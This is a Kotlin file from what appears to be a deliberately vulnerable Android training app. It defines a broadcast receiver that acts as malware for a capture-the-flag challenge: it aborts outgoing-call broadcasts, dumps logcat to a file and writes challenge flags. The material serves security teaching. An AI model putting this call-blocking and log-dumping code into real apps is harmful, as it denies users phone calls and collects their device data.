package uk.ac.swansea.dascalu.dvmicc.acpu_booster.icc

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import uk.ac.swansea.dascalu.dvmicc.acpu_booster.BROADCAST_THEFT_DOS_ID

import uk.ac.swansea.dascalu.dvmicc.acpu_booster.R
import uk.ac.swansea.dascalu.dvmicc.acpu_booster.SecuritySettings
import uk.ac.swansea.dascalu.dvmicc.acpu_booster.loadSecuritySettingsFromFile

import java.io.OutputStreamWriter

class AppActivityReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context?, intent: Intent?) {
        if(context != null) {
            val securitySettings : SecuritySettings = loadSecuritySettingsFromFile(context)

            //malware only works if broadcast theft dos challenge is active and if malware mode is
            //overcome
            if(securitySettings.currentChallengeIndex == BROADCAST_THEFT_DOS_ID
                    && securitySettings.malwareOvercome) {
                //check intent action is the one the receiver listens for
                if(intent!!.action == "android.intent.action.NEW_OUTGOING_CALL") {
                    abortBroadcast()
                    resultData = null

                    if(securitySettings.securityLevel == "low") {
                        writeDataToFile(context, context.resources.getStringArray(
                                R.array.broadcastTheftDOSFlags)[0])
                    } else if(securitySettings.securityLevel == "high") {
                        writeDataToFile(context, context.resources.getStringArray(
                                R.array.broadcastTheftDOSFlags)[1])
                    }
                }
            }
        }
    }

    private fun writeDataToFile(context: Context, flag: String?) {
        val fileOut = context.openFileOutput("data.txt", Context.MODE_APPEND)
        val writer = OutputStreamWriter(fileOut)

        Runtime.getRuntime().exec("logcat -f ${context.filesDir}/data.txt")
        Thread.sleep(500)

        if(flag != null) {
            writer.write("\nFlag: $flag\n")
        }

        writer.close()
    }
}